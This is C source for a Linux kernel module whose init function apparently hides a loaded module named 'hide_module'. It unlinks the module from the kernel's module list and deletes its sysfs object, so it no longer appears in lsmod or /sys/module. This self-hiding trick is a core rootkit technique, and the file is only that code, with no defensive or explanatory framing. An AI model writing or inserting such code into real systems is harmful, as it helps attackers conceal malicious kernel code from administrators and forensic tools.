#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/kobject.h>

MODULE_DESCRIPTION("Wait, this isn't supposed to be here");
MODULE_AUTHOR("Me");
MODULE_LICENSE("GPL");

static int __init hide(void)
{
  pr_info("Hiding module");
  struct module *module = find_module("hide_module");

  list_del(&module->list);
  kobject_del(&module->mkobj.kobj);
  pr_info("Module hidden °-°");
  return 0;
}

module_init(hide);

static void __exit noop(void)
{

}

module_exit(noop);
